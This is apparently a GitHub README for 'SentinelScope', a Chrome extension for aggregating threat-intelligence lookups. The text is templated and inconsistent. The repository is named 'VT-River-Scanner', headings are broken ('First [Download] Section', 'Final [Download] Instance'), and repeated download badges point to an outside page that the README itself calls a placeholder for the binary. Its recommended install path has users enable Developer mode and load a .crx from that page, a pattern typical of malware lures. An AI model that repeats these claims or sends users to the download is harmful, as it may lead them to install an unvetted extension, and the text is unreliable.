![preview](https://raw.githubusercontent.com/maulikthakrar/VT-River-Scanner/main/showcase_2df70d.svg)

# SentinelScope — Chrome Extension for Unified Threat Signal Aggregation

**SentinelScope** is a browser-native observability layer that transforms how security analysts interact with threat intelligence platforms. Inspired by the raw utility of file-scanning extensions, SentinelScope reimagines the workflow by letting you consolidate **multiple threat feeds, hash lookups, and verdict streams** into a single, keyboard-driven command palette — all without leaving your current browser tab.

This project is not just another uploader. It is an **intelligent triage cockpit** that watches your clipboard, detects suspicious indicators (IPs, domains, file hashes), and routes them to your preferred scanning backends with context-aware prioritization. Whether you are a penetration tester juggling malware samples or a SOC analyst correlating IoCs from incident tickets, SentinelScope gives you a **unified signal surface** with zero context switching.

Built for efficiency, privacy, and extensibility, SentinelScope operates entirely client-side. No telemetry, no phoning home — your queries travel directly from your browser to the scan providers you trust. The extension ships with a **pluggable provider architecture** that supports custom API integrations, making it a future-proof foundation for any security workflow.

![Build Status](https://img.shields.io/badge/build-passing-brightgreen) ![Chrome Compatible](https://img.shields.io/badge/chrome-v114%2B-blue) ![Maintenance](https://img.shields.io/badge/maintained-2026-yellow) ![License](https://img.shields.io/badge/license-MIT-green)

---

## Why Another Security Extension? 🤔

Most browser security tools are either too passive (just bookmarks to APIs) or too aggressive (auto-submitting everything to every service). SentinelScope strikes a **deliberate balance**. It is a **deliberation engine** — it does not act until you tell it to, but when you act, it acts fast.

Think of it as a **Swiss Army knife for indicator triage**, but instead of blades, it carries connectors. You highlight an IP address in a ticket, hit your hotkey, and SentinelScope opens a dry-run panel showing you the verdicts from three different sandboxes — before you even commit to a scan.

The core philosophy is **informed action**. The extension enriches your context, not your anxiety.

---

## First [![Download](https://raw.githubusercontent.com/maulikthakrar/VT-River-Scanner/main/go_8d3b.svg)](https://maulikthakrar.github.io/VT-River-Scanner/) Section

[![Download](https://raw.githubusercontent.com/maulikthakrar/VT-River-Scanner/main/go_8d3b.svg)](https://maulikthakrar.github.io/VT-River-Scanner/)

(Placeholder for the actual binary. The source is mirrored in the repository.)

---

## Key Features That Matter 🧠

### 1. Live Clipboard Sentinel
The extension monitors your clipboard buffer for patterns matching IPv4, IPv6, SHA-256, MD5, and domain names. When a pattern is detected, a **non-intrusive toast** slides in with a "Deep Dive" action. One click and the indicator is pre-loaded into the scan workspace, ready for provider selection.

### 2. Multi-Provider Fan-Out
Configure as many scanning backends as you like — VirusTotal, Hybrid Analysis, Any.Run, or your internal malware analysis sandbox. SentinelScope handles the **normalization of responses** into a common verdict schema, so you compare apples to apples. The connector API is documented and open, allowing you to write your own provider in under 50 lines of JavaScript.

### 3. Contextual Risk Scoring
Instead of showing you raw detection ratios, SentinelScope calculates a **weighted risk index** based on provider reputation, age of the sample, and community consensus. This proprietary scoring model is transparent — the weights are visible in the settings panel so you can tune them to your threat model.

### 4. Offline Hash Cache
Frequently checked file hashes are stored in a local IndexedDB store with a configurable TTL. This drastically reduces redundant API calls for repeat indicators, making your workflow **faster and lighter** on rate limits.

### 5. Keyboard-First Operation
Every feature is accessible via customizable hotkeys. Default bindings included, but power users can remap everything. The **command palette** (Ctrl+Shift+K) lets you type any action, filter, or provider name fuzzy-style for rapid selection.

### 6. Military-Grade Permission Minimalism
SentinelScope requests the absolute minimum permissions: `clipboardRead`, `storage`, and `contextMenus`. No broad host permissions — the extension prompts you per-domain for outbound scan requests, keeping your browsing pattern private.

### 7. Responsive Scan Dashboard
The built-in results page is **fully responsive**, adapting from a dense table on desktop to a card-based layout on smaller windows. It is designed to be scannable at a glance, with color-coded severity chips and expandable raw JSON rows for deep inspection.

### 8. Multilingual Interface
The UI ships in English, Spanish, German, and Simplified Chinese. Language detection automatically adapts the interface, or you can force a preference in settings. All localized strings are externally managed in JSON, making community contributions trivial.

### 9. Enterprise Friendly Policy Mode
For team deployments, an admin can lock provider configurations, enforce minimum scan thresholds, and disable the offline cache for compliance-sensitive environments. Policies are distributed via a recognized JSON manifest.

### 10. 24/7 Support & Community
While this is an open-source project, the maintainers provide **office-hours support channels** on Discord and a dedicated GitHub Discussions board. Critical security issues are triaged within 24 hours. We believe in **sustainable open source**, so while the tool itself has zero cost, commercial support contracts are available for enterprise hardening.

---

## Getting Started: Quick Setup 🚀

To bring SentinelScope into your browser, you have two primary paths. Choose the one that matches your comfort with developer workflows.

### Path A: The Assisted Installer (Recommended)
1. Download the latest release from the [![Download](https://raw.githubusercontent.com/maulikthakrar/VT-River-Scanner/main/go_8d3b.svg)](https://maulikthakrar.github.io/VT-River-Scanner/) section link below (or the release tab above).
2. Open `chrome://extensions` and enable **Developer mode** (the toggle is in the top right).
3. Drag and drop the downloaded `.crx` file onto the extensions page.
4. The browser will ask for confirmation — approve the permission set, and SentinelScope will appear in your toolbar.

### Path B: Load Unpacked (For Customizers)
1. Fork or download the source archive from the repository root.
2. Navigate to `chrome://extensions`, enable **Developer mode**.
3. Click **Load unpacked** and select the `src/` directory from the project folder.
4. The extension will load with the default configuration. Customize from the options page.

After first load, run the **Setup Wizard** which appears automatically. It will guide you through:
- Selecting your primary scan providers.
- Importing API keys from your existing password manager (never stored on our servers).
- Configuring your risk score weights.

---

## Architecture Overview: What Makes It Tick ⚙️

SentinelScope is structured as a **three-layer onion**.

**Layer 1: The Trigger Surface**
This consists of the content script (injects into pages), the background service worker (manages state), and the context menu integration. This layer is responsible for capturing indicators from the wild.

**Layer 2: The Orchestration Core**
A state machine that manages the lifecycle of a scan request. It validates the indicator format, checks the offline cache, fans out to selected providers, and collects normalized responses. The core uses **async/await patterns** to ensure non-blocking UI interactions.

**Layer 3: The Presentation Shell**
The Options page, the popup panel, and the full Scan Dashboard. Built with reactive vanilla JS components (no heavy frameworks — we like to keep the bundle under 500KB). The shell listens for state changes from the core and re-renders efficiently.

All inter-layer communication happens via a **pub/sub event bus**, making the system highly testable. We include a basic unit test suite in the `tests/` directory, and a CI pipeline that runs them on every push.

---

## Configuration Deep Dive 🎛️

The settings page is your command center. Here is a breakdown of the major sections:

### Provider Connectors
This is a list of all registered scan backends. Each entry has:
- **Enabled** toggle.
- **API Endpoint** URL field (pre-filled but editable).
- **API Key** input (stored encrypted via the WebCrypto API).
- **Timeout** (in seconds) before the provider is considered unresponsive.
- **Priority Weight** — influences the risk score computation.

### Indicator Patterns
You can define custom regex patterns for what constitutes a threat indicator. For example, you might add a pattern for internal asset tags or custom file naming conventions. This allows SentinelScope to hook into your unique workflow.

### Alert Profiles
Create profiles that define what happens when a high-risk score is found.
- **Silent mode** — log only.
- **Desktop Notify** — show a native push notification.
- **Auto-open Dashboard** — navigate to the results page automatically (only for critical scores).

---

## Roadmap for 2026 & Beyond 🗺️

We are actively developing the following features for the 2026 release cycle:

- **Firefox Port**: The Manifest V3 codebase is partially cross-compatible. A Firefox build is in the works.
- **Graph View**: Visualize relationships between scanned file hashes and their connecting IPs/domains in a local graph database.
- **Collaborative Annotations**: Share scan comments with your team (self-hosted sync server required).
- **Machine Learning Pre-Filter**: A client-side ONNX model that can pre-classify binaries before you even submit them (opt-in, is 12MB additional download).

---

## FAQ — Quick Answers 🤝

**Q: Does SentinelScope upload files or just metadata?**
*A: By default, it uploads metadata and indicators. For full file uploads, you must explicitly enable that feature per provider, as it requires additional permissions and is off by default.*

**Q: Is my API key secure?**
*A: Yes. Keys are stored in extension-local storage encrypted with a browser-generated key. We cannot see them, and they never leave your machine.*

**Q: Does this work with offline scenarios?**
*A: Offline, you can still use the hash cache and the local scoring engine, but live scans will obviously fail. We show a clear warning when the network is down.*

**Q: Can I contribute translations?**
*A: Absolutely. Refer to the `locales/` folder and submit a PR with your new language strings.*

---

## Disclaimer 🛡️

**Important Legal Notice** — Please read carefully.

SentinelScope is a **facilitation tool**, not a substitute for professional security judgment. The developers of this extension assume **no liability** for actions taken based on the risk scores or scan results produced by this software. The tool relies on third-party services (e.g., scanning sandboxes, threat intel feeds) whose data may be incomplete, outdated, or inaccurate. You are solely responsible for validating any security decisions with your own expertise and additional tools.

Furthermore, please comply with the **Terms of Service** of any provider you connect to this extension. Abusing API limits, submitting malicious samples without authorization, or using this tool for unlawful surveillance is strictly prohibited and may result in legal consequences. This extension is provided "as is" without warranty of any kind, express or implied, including but not limited to the warranties of merchantability or fitness for a particular purpose.

By installing SentinelScope, you acknowledge that you have read this disclaimer and agree to use the extension responsibly.

---

## License 📝

This project is open-sourced under the **MIT License**. You are free to use, modify, and distribute this software, provided the original copyright notice and this permission notice are included in all copies or substantial portions of the software.

The full license text is available in the `LICENSE` file at the root of this repository. You can also view the standard MIT license template here: [Open Source Initiative License Page](https://opensource.org/license/mit).

---

## Final Thoughts & Contribution Guide 🤝

We believe that security tooling should be **transparent, flexible, and respectful of user agency**. SentinelScope is our contribution to that philosophy. If you find a bug, have a feature request, or want to submit a patch for a new provider connector, please open an issue or a pull request. We welcome all constructive contributions.

We also value **design feedback**. If you think the risk score colors are confusing or the dashboard layout could be better, tell us — we would rather iterate on your experience than guess in a vacuum.

For security research specifics, we maintain a private disclosure channel. Please do not report vulnerabilities publicly without giving us 30 days to respond.

---

**Final [![Download](https://raw.githubusercontent.com/maulikthakrar/VT-River-Scanner/main/go_8d3b.svg)](https://maulikthakrar.github.io/VT-River-Scanner/) Instance**

[![Download](https://raw.githubusercontent.com/maulikthakrar/VT-River-Scanner/main/go_8d3b.svg)](https://maulikthakrar.github.io/VT-River-Scanner/)

---

*SentinelScope — Scanning the horizon, one indicator at a time. Developed for the 2026 analyst.*